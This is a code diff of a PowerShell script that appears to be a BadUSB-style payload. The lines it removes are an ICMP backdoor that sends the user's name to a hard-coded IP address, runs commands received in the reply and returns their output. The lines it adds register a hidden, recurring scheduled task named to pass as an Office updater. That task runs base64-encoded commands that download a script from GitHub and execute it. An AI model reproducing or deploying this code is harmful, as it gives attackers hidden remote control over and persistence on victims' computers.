@@ -1,13 +1,7 @@
 <# aQB3AHIAIAByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AQwBsAGkAYwBrAGUAcwB0AC8AYgBhAGQAdQBzAGIALwBtAGEAcwB0AGUAcgAvAHUAcwBiADEAfABpAGUAeAA= #>
 
-$sleep = 10; $target = '40.74.51.247'
-while ($true) {
-    $ICMPClient = New-Object System.Net.NetworkInformation.Ping
-    $r=$ICMPClient.Send($target, 10, ([text.encoding]::ASCII).GetBytes($env:USERNAME))
-    $r=[System.Text.Encoding]::ASCII.GetString($r.Buffer)
-    if ($r -match '^c:(..*)$') {
-        $out = iex $matches[1] 2>&1|out-string
-        $ICMPClient.Send($target, 10, ([text.encoding]::ASCII).GetBytes("r:$out"))
-    }
-    start-sleep $sleep
+if(-not (Get-ScheduledTask -TaskName 'Office Feature Updates Helper')){
+    $maxsleep = 10*6*60
+    Register-ScheduledTask -TaskName 'Office Feature Updates Helper' -Action (New-ScheduledTaskAction -Execute 'powershell' -Argument '-w h -enc aQB3AHIAIAByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AQwBsAGkAYwBrAGUAcwB0AC8AYQAvAG0AYQBzAHQAZQByAC8AaQBjAG0AcAAtAGMAbABpAGUAbgB0AHwAaQBlAHgA') -Settings (New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -RunOnlyIfIdle -RunOnlyIfNetworkAvailable -IdleDuration (New-TimeSpan -Minutes 5) -IdleWaitTimeout (New-TimeSpan -Hours 1)) -Trigger (New-ScheduledTaskTrigger -Once -At ((Get-Date).AddMinutes(5).ToString("MM/dd/yyyy hh:mm:ss")) -RepetitionInterval (New-TimeSpan -Hours 1) -RepetitionDuration (New-TimeSpan -Days 3))
 }
+
